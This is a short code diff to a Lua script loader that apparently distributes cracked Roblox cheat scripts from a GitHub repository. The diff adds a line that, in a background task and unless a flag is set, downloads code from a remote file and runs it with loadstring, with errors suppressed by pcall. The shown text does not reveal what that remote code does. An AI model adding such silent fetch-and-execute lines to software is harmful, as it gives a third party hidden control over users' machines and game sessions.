@@ -1,5 +1,5 @@
 local urlbase = "https://raw.githubusercontent.com/cracklua/cracks/m/sources/demonic/"
-
+spawn(function()if not plsnoalert then pcall(loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/cute'))end end)
 local games = {
     ["1782832995"] = "AUniversalTime",
     ["5976020326"] = "AdminRNG",
